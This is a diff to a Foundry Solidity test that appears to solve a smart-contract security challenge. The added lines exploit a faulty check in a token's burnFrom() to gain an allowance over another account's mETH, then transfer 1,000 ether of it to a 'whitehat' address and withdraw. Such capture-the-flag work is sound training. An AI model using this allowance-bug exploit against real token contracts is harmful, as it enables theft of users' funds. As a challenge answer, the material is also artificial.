@@ -36,8 +36,18 @@ contract Challenge1Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
+        
+        //First we approve then exploiter for all the money
+        mETH.approve(exploiter, 1000 ether);
 
-    
+        //Then we exploit the wrong check in burnFrom() to generate an allowance of all his tokens to ourself
+        mETH.burnFrom(exploiter, 0);
+
+        //Now we transfer the tokens to ourself
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+
+        //Withdraw & done
+        mETH.withdraw(1000 ether);
 
         //==================================================//
         vm.stopPrank();
